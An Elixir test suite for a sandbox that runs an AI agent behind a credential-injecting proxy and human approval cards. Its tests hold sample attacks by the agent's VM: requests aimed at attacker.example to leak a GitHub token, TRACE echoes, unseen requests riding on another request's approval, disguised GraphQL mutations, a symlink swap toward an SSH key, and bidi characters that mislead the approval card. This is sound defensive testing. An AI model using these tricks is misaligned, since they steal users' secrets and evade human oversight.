defmodule MDTClient.Sandbox.GuaranteesTest do
  @moduledoc """
  What docs/agent_sandbox.md says the sandbox does, one test per sentence.
  Written during the 2026-11-13 review, when all of them failed; each names
  the gap it closed. They go through the proxy as microsandbox reaches it,
  with an upstream that answers with the request it received.
  """
  use ExUnit.Case, async: false

  import ExUnit.CaptureLog

  alias MDTClient.Sandbox

  alias MDTClient.Sandbox.{
    Allowance,
    Describe,
    Grant,
    HostCommand,
    HostRun,
    Server,
    Share
  }

  alias MDTClient.Sandbox.CertificateAuthority, as: CA
  alias MDTClient.Sandbox.Egress.Connection
  alias MDTClient.Vault
  alias MDTClient.Vault.Store

  @real "ghp_REAL_SECRET_VALUE"

  ## Harness: the proxy as microsandbox reaches it, and an upstream that
  ## answers with the request head it received in the response body.

  defp proxy(username) do
    upstream = start_upstream()
    {:ok, listen} = :gen_tcp.listen(0, [:binary, active: false, ip: {127, 0, 0, 1}])
    {:ok, port} = :inet.port(listen)

    options = [
      upstream: fn _host ->
        :ssl.connect(~c"127.0.0.1", upstream, verify: :verify_none, active: false, mode: :binary)
      end
    ]

    spawn_link(fn -> accept(listen, username, options) end)
    [{:Certificate, ca, _}] = username |> Sandbox.ca_pem() |> :public_key.pem_decode()
    %{proxy: port, ca: ca}
  end

  defp accept(listen, username, options) do
    {:ok, client} = :gen_tcp.accept(listen)

    pid =
      spawn(fn ->
        receive do
          :go -> Connection.run(client, username, options)
        end
      end)

    :gen_tcp.controlling_process(client, pid)
    send(pid, :go)
    accept(listen, username, options)
  end

  defp start_upstream do
    leaf = CA.leaf(CA.new(), "upstream.test")

    {:ok, listen} =
      :ssl.listen(0, CA.ssl_options(leaf) ++ [active: false, mode: :binary, reuseaddr: true])

    {:ok, {_, port}} = :ssl.sockname(listen)
    spawn_link(fn -> serve(listen) end)
    port
  end

  defp serve(listen) do
    {:ok, socket} = :ssl.transport_accept(listen)

    spawn(fn ->
      {:ok, socket} = :ssl.handshake(socket)
      head = read_until(socket, "\r\n\r\n", "")
      # Give the body a moment, then echo everything received, as TRACE and
      # debugging endpoints do.
      rest =
        case :ssl.recv(socket, 0, 200) do
          {:ok, more} -> more
          _ -> ""
        end

      body = "RECEIVED:\n" <> head <> rest

      :ssl.send(
        socket,
        "HTTP/1.1 200 OK\r\ncontent-length: #{byte_size(body)}\r\nconnection: close\r\n\r\n#{body}"
      )

      :ssl.close(socket)
    end)

    serve(listen)
  end

  defp read_until(socket, marker, acc) do
    if String.contains?(acc, marker) do
      acc
    else
      case :ssl.recv(socket, 0, 5_000) do
        {:ok, data} -> read_until(socket, marker, acc <> data)
        {:error, _} -> acc
      end
    end
  end

  defp read_all(socket, mod, acc \\ "") do
    case mod.recv(socket, 0, 5_000) do
      {:ok, data} -> read_all(socket, mod, acc <> data)
      {:error, _closed} -> acc
    end
  end

  defp https(%{proxy: proxy, ca: ca}, host, request) do
    {:ok, socket} = :gen_tcp.connect(~c"127.0.0.1", proxy, [:binary, active: false])
    :ok = :gen_tcp.send(socket, "CONNECT 140.82.112.3:443 HTTP/1.1\r\n\r\n")
    {:ok, "HTTP/1.1 200" <> _} = :gen_tcp.recv(socket, 0, 5_000)

    {:ok, tls} =
      :ssl.connect(socket,
        verify: :verify_peer,
        cacerts: [ca],
        server_name_indication: String.to_charlist(host),
        active: false,
        mode: :binary
      )

    :ok = :ssl.send(tls, request)
    read_all(tls, :ssl)
  end

  defp github(username, uses) do
    {:ok, grant} =
      Sandbox.create_grant(username, %{
        "kind" => "token",
        "preset" => "github",
        "name" => "GitHub",
        "purpose" => "The GitHub API",
        "hosts" => "api.github.com, github.com",
        "env" => "GH_TOKEN",
        "prefix" => "ghp_",
        "value" => @real
      })

    {:ok, grant} = Sandbox.turn_on(username, grant.id, :until_off, uses)
    grant
  end

  defp waiting(username, count) do
    Enum.find_value(1..300, fn _ ->
      case Sandbox.snapshot(username).waiting do
        list when length(list) >= count -> list
        _ -> Process.sleep(10) && nil
      end
    end) || Sandbox.snapshot(username).waiting
  end

  setup do
    MDTClient.VaultHelpers.unlocked_identity("review")
  end

  ## 1. Expiry

  describe "expiry (guarantee 5)" do
    test "an allowance past its `until` covers nothing" do
      past = DateTime.add(DateTime.utc_now(), -3600, :second)
      allowance = %Allowance{id: "a", pattern: :all, until: past}
      refute Allowance.covers?(allowance, "GET api.github.com/user")
    end

    test "a grant past its `expires_at` is not on" do
      past = DateTime.add(DateTime.utc_now(), -3600, :second)
      grant = %Grant{id: "g", name: "G", kind: :token, state: :on, expires_at: past}
      refute Grant.on?(grant)
    end

    test "a timed allowance still ends after MDT restarts", %{username: username, key: key} do
      grant = github(username, :ask)
      path = MDTClient.Accounts.store_path(username, "sandbox.bin")

      # Lock, then put the saved allowance's end in the past, as it is after
      # a restart (or a suspend) that outlasted it.
      :ok = Store.close(username)
      {:ok, saved} = Vault.open(key, File.read!(path))
      past = DateTime.add(DateTime.utc_now(), -3600, :second)

      grants =
        Enum.map(saved.grants, fn g ->
          %{g | allowances: [%Allowance{id: "allowance-old", pattern: :all, until: past}]}
        end)

      File.write!(path, Vault.seal(key, %{saved | grants: grants}))
      :ok = Store.open(username, key)

      net = proxy(username)

      sent =
        Task.async(fn ->
          https(
            net,
            "api.github.com",
            "GET /user HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: token #{grant.placeholder}\r\n\r\n"
          )
        end)

      # Intent: the allowance ended an hour ago, so this use asks.
      held = waiting(username, 1)
      for approval <- held, do: Sandbox.decide(username, approval.id, :deny)
      response = Task.await(sent, 10_000)

      assert length(held) == 1, "the request went out without asking: #{inspect(response)}"
      refute response =~ @real
    end
  end

  describe "expiry across a restart" do
    test "a grant whose time ran out while MDT was closed is off when it starts", %{
      username: username,
      key: key
    } do
      grant = github(username, :ask)
      path = MDTClient.Accounts.store_path(username, "sandbox.bin")

      :ok = Store.close(username)
      {:ok, saved} = Vault.open(key, File.read!(path))
      past = DateTime.add(DateTime.utc_now(), -3600, :second)
      grants = Enum.map(saved.grants, &%{&1 | state: :on, expires_at: past})
      File.write!(path, Vault.seal(key, %{saved | grants: grants}))
      :ok = Store.open(username, key)

      # The sandbox looks at the clock as its first message.
      _ = :sys.get_state(Store.whereis(Server, username))
      assert [%{id: id, state: :off, expires_at: nil}] = Sandbox.snapshot(username).grants
      assert id == grant.id
    end
  end

  ## 2. One approval, one request

  describe "a decision covers what the card shows" do
    test "a different body does not ride on another request's approval", %{username: username} do
      grant = github(username, :ask)
      net = proxy(username)

      send_issue = fn body ->
        Task.async(fn ->
          https(
            net,
            "api.github.com",
            "POST /repos/o/r/issues HTTP/1.1\r\nHost: api.github.com\r\n" <>
              "Authorization: token #{grant.placeholder}\r\nContent-Type: application/json\r\n" <>
              "Content-Length: #{byte_size(body)}\r\n\r\n" <> body
          )
        end)
      end

      first = send_issue.(~s({"title":"harmless"}))
      [shown] = waiting(username, 1)
      second = send_issue.(~s({"title":"NOT SHOWN ON THE CARD","assignees":["attacker"]}))
      Process.sleep(300)

      cards = Sandbox.snapshot(username).waiting
      :ok = Sandbox.decide(username, shown.id, :allow_once)
      first_response = Task.await(first, 10_000)

      second_response =
        case Task.yield(second, 1_500) do
          {:ok, response} -> response
          nil -> :still_held
        end

      for approval <- Sandbox.snapshot(username).waiting,
          do: Sandbox.decide(username, approval.id, :deny)

      if second_response == :still_held, do: Task.await(second, 10_000)

      assert first_response =~ "harmless"

      assert length(cards) == 2 and second_response == :still_held,
             "cards waiting: #{length(cards)}; the unseen request got: " <>
               inspect(second_response, printable_limit: 400)
    end
  end

  ## 3. Facts the agent cannot write

  describe "facts (\"An approval shows facts MDT worked out, not what the agent says\")" do
    defp graphql(document, operation_name \\ nil) do
      body = Jason.encode!(%{query: document, operationName: operation_name})

      Describe.request(%{
        host: "api.github.com",
        method: "POST",
        path: "/graphql",
        headers: [],
        body: body
      })
    end

    test "a mutation behind a comment is not called a query" do
      described = graphql("# list things\nmutation { deleteRepository(input: {}) { id } }")
      assert described.title =~ "mutation", described.title
    end

    test "a mutation selected by operationName is not called a query" do
      described =
        graphql(
          "query viewer { viewer { login } } mutation viewer2 { deleteRepository(input: {}) { id } }",
          "viewer2"
        )

      assert described.title =~ "mutation", described.title
    end

    test "allow-similar for a query does not cover a mutation" do
      query = graphql("query viewer { viewer { login } }")

      mutation =
        graphql(
          "query a { __typename } mutation viewer { deleteRepository(input: {}) { id } }",
          "viewer"
        )

      refute query.pattern == mutation.pattern, "both: #{query.pattern}"
    end
  end

  ## 4. The request MDT judged is the request the host acts on

  describe "what goes upstream" do
    test "an absolute-form target naming another host is refused", %{username: username} do
      grant = github(username, :all)

      response =
        https(
          proxy(username),
          "api.github.com",
          "GET http://attacker.example/collect HTTP/1.1\r\nHost: api.github.com\r\n" <>
            "Authorization: token #{grant.placeholder}\r\n\r\n"
        )

      refute response =~ "GET http://attacker.example/collect",
             "forwarded as sent, with the real value:\n" <> response
    end

    test "a second Host header naming another host is refused", %{username: username} do
      grant = github(username, :all)

      response =
        https(
          proxy(username),
          "api.github.com",
          "GET /user HTTP/1.1\r\nHost: api.github.com\r\nHost: attacker.example\r\n" <>
            "Authorization: token #{grant.placeholder}\r\n\r\n"
        )

      refute response =~ "host: attacker.example", "forwarded with both:\n" <> response
    end

    test "the real value never comes back in a response body", %{username: username} do
      grant = github(username, :all)

      response =
        https(
          proxy(username),
          "api.github.com",
          "TRACE /user HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: token #{grant.placeholder}\r\n\r\n"
        )

      refute response =~ @real, "the VM read the real value:\n" <> response
    end
  end

  ## 5. Host commands run where the card says

  describe "host commands (guarantee 9)" do
    test "the command runs in the folder the card showed" do
      base = Path.join(System.tmp_dir!(), "mdt-review-#{System.unique_integer([:positive])}")
      share = Path.join(base, "share")
      secret = Path.join(base, "home-ssh")
      File.mkdir_p!(Path.join(share, "project"))
      File.mkdir_p!(secret)
      File.write!(Path.join(secret, "id_ed25519"), "PRIVATE KEY")
      on_exit(fn -> File.rm_rf!(base) end)

      {:ok, share} = MDTClient.Sandbox.Shares.realpath(share)
      {:ok, secret} = MDTClient.Sandbox.Shares.realpath(secret)
      dir = Path.join(share, "project")

      {:ok, checked} =
        HostCommand.check(
          %{script: "ls", dir: dir, reason: "list the project"},
          [%Share{path: share, mode: :rw}],
          [],
          home: base,
          user: "tester"
        )

      assert checked.dir == dir
      assert {"In", ^dir} = List.keyfind(checked.facts, "In", 0)

      # What a process in the VM can do in a read-write share while the card
      # waits for the user.
      File.rm_rf!(dir)
      File.ln_s!(secret, dir)

      result =
        HostRun.run(
          %{script: "pwd -P; ls", dir: checked.dir, timeout: 10},
          fn _group -> :ok end
        )

      refute result.output =~ "id_ed25519",
             "approved for #{dir}, ran in #{String.trim(result.output)}"
    end
  end

  ## 6. No real value in logs (guarantee 1)

  describe "logs (guarantee 1)" do
    test "a crash while a value is being stored does not log it", %{username: username} do
      pid = Store.whereis(Server, username)
      ref = Process.monitor(pid)

      log =
        capture_log(fn ->
          # Any bug on this path: here, a name that isn't text.
          catch_exit(
            Server.call(username, {
              :create_grant,
              %{"kind" => "token", "name" => 123, "value" => "s3cret-pasted-token"}
            })
          )

          assert_receive {:DOWN, ^ref, :process, ^pid, _reason}
          Process.sleep(100)
        end)

      refute log =~ "s3cret-pasted-token", String.slice(log, 0, 600)
    end
  end

  ## 7. /mnt/mdt is never half written

  describe "the inbox" do
    test "a token file never disappears while grants change", %{username: username} do
      grant = github(username, :ask)
      file = Path.join([Sandbox.snapshot(username).inbox, "tokens", grant.id])
      assert File.read!(file) == grant.placeholder
      parent = self()

      reader =
        spawn_link(fn ->
          Stream.repeatedly(fn -> File.read(file) end)
          |> Enum.reduce_while(0, fn result, missing ->
            missing = if result == {:ok, grant.placeholder}, do: missing, else: missing + 1

            receive do
              :stop -> {:halt, send(parent, {:missing, missing})}
            after
              0 -> {:cont, missing}
            end
          end)
        end)

      for _ <- 1..100 do
        {:ok, _} = Sandbox.turn_off(username, grant.id)
        {:ok, _} = Sandbox.turn_on(username, grant.id, 60, :ask)
      end

      send(reader, :stop)
      assert_receive {:missing, missing}, 5_000
      assert missing == 0, "#{missing} reads found the token file missing or partial"
    end
  end

  ## 8. Bounded state

  describe "bounded state" do
    test "a name under a wildcard host is served with a certificate clients accept", %{
      username: username
    } do
      {:ok, grant} =
        Sandbox.create_grant(username, %{
          "kind" => "token",
          "name" => "Google",
          "purpose" => "Google APIs",
          "hosts" => "*.googleapis.com",
          "env" => "X_TOKEN",
          "value" => "ya29.real"
        })

      {:ok, grant} = Sandbox.turn_on(username, grant.id, :until_off, :all)
      %{proxy: proxy, ca: ca} = proxy(username)

      {:ok, socket} = :gen_tcp.connect(~c"127.0.0.1", proxy, [:binary, active: false])
      :ok = :gen_tcp.send(socket, "CONNECT 142.250.0.1:443 HTTP/1.1\r\n\r\n")
      {:ok, "HTTP/1.1 200" <> _} = :gen_tcp.recv(socket, 0, 5_000)

      # As curl and browsers check a name: wildcards count, one label deep.
      {:ok, tls} =
        :ssl.connect(socket,
          verify: :verify_peer,
          cacerts: [ca],
          server_name_indication: ~c"storage.googleapis.com",
          customize_hostname_check: [
            match_fun: :public_key.pkix_verify_hostname_match_fun(:https)
          ],
          active: false,
          mode: :binary
        )

      :ok =
        :ssl.send(
          tls,
          "GET /b HTTP/1.1\r\nHost: storage.googleapis.com\r\nAuthorization: Bearer #{grant.placeholder}\r\n\r\n"
        )

      assert read_all(tls, :ssl) =~ "authorization: Bearer ya29.real"
    end

    test "names under a wildcard host don't each cost a certificate", %{username: username} do
      {:ok, _grant} =
        Sandbox.create_grant(username, %{
          "kind" => "token",
          "name" => "Google",
          "purpose" => "Google APIs",
          "hosts" => "*.googleapis.com",
          "env" => "X_TOKEN",
          "value" => "ya29.real"
        })

      for i <- 1..2_000, do: Server.call(username, {:leaf, "h#{i}.googleapis.com"})
      state = :sys.get_state(Store.whereis(Server, username))

      assert map_size(state.leaves) <= 64,
             "#{map_size(state.leaves)} certificates kept, " <>
               "#{div(:erts_debug.flat_size(state.leaves) * 8, 1024)} KiB, never dropped"
    end
  end

  ## 9. MDT writes nothing into storage the VM can write

  describe "what the VM can write is the VM's (\"MDT never writes into storage the VM can write\")" do
    test "the instructions and memo reach the VM through /mnt/mdt, for it to copy itself", %{
      username: username
    } do
      inbox = Sandbox.snapshot(username).inbox

      assert File.read!(Path.join(inbox, "agents-block.md")) ==
               MDTClient.Sandbox.Instructions.block()

      assert Bitwise.band(File.stat!(Path.join(inbox, "bin/mdt-boot")).mode, 0o111) != 0

      if memo = MDTClient.Sandbox.Memory.host_memo() do
        assert File.read!(Path.join(inbox, "bin/memo")) == File.read!(memo)
      end
    end

    test "nothing in MDT writes the agents' files or the memo tool on the host side" do
      # The two functions that did, and followed links the VM planted, are gone.
      refute function_exported?(MDTClient.Sandbox.Instructions, :write_home!, 2)
      refute function_exported?(MDTClient.Sandbox.Memory, :prepare!, 1)
    end
  end

  ## 10. Text the VM chooses

  describe "text the VM chooses (\"what an approval shows, shows all it holds\")" do
    # Every binary inside a term, however deep.
    defp texts(term) when is_binary(term), do: [term]
    defp texts(term) when is_list(term), do: Enum.flat_map(term, &texts/1)
    defp texts(term) when is_tuple(term), do: term |> Tuple.to_list() |> texts()
    defp texts(%DateTime{}), do: []
    defp texts(%_{} = struct), do: struct |> Map.from_struct() |> texts()
    defp texts(term) when is_map(term), do: term |> Map.to_list() |> texts()
    defp texts(_other), do: []

    defp assert_shown(term) do
      for text <- texts(term) do
        assert String.valid?(text), "not UTF-8: #{inspect(text)}"
        assert MDTClient.Sandbox.Shown.hidden(text) == [], "hides something: #{inspect(text)}"
        assert {:ok, _} = Jason.encode(text)
      end
    end

    test "a request whose target isn't visible ASCII is refused, and nobody is asked", %{
      username: username
    } do
      grant = github(username, :ask)
      net = proxy(username)

      for target <- ["/repos/\xff", "/repos/caf\xc3\xa9", "/repos/a" <> <<0x202E::utf8>> <> "b"] do
        response =
          https(
            net,
            "api.github.com",
            "GET #{target} HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: token #{grant.placeholder}\r\n\r\n"
          )

        assert response =~ "HTTP/1.1 400", inspect(target)
        assert response =~ "visible ASCII"
        refute response =~ @real
      end

      assert Sandbox.snapshot(username).waiting == []
      assert_shown(Sandbox.events(username))
    end

    test "header values and a body made to mislead reach a card that shows all it holds", %{
      username: username
    } do
      grant = github(username, :ask)
      net = proxy(username)
      rlo = <<0x202E::utf8>>

      body =
        Jason.encode!(%{title: "fix " <> rlo <> "kcah", body: "a" <> <<0x200B::utf8>> <> "b"})

      sent =
        Task.async(fn ->
          https(
            net,
            "api.github.com",
            "POST /repos/a/b/issues HTTP/1.1\r\nHost: api.github.com\r\n" <>
              "User-Agent: curl\xff " <>
              rlo <>
              "gnp\r\n" <>
              "Authorization: token #{grant.placeholder}\r\n" <>
              "Content-Type: application/json\r\nContent-Length: #{byte_size(body)}\r\n\r\n" <>
              body
          )
        end)

      assert [approval] = waiting(username, 1)

      # Everything of the card but the request itself, which is kept as it
      # was sent and read through `RequestView`, and the digest retries are
      # joined by, which is compared and never shown.
      assert_shown(approval |> Map.from_struct() |> Map.drop([:request, :join]))
      assert Enum.any?(texts(approval.claims), &(&1 =~ "\\u{202E}"))

      marks = MDTClient.Sandbox.RequestView.marks(Sandbox.snapshot(username).grants)
      assert_shown(MDTClient.Sandbox.RequestView.headers(approval.request, marks))
      assert_shown(MDTClient.Sandbox.RequestView.body(approval.request))
      assert_shown(MDTClient.Sandbox.RequestView.curl(approval.request, marks))

      :ok = Sandbox.decide(username, approval.id, :deny)
      assert Task.await(sent, 10_000) =~ "mdt_denied_by_user"
      assert_shown(Sandbox.events(username))
    end
  end
end
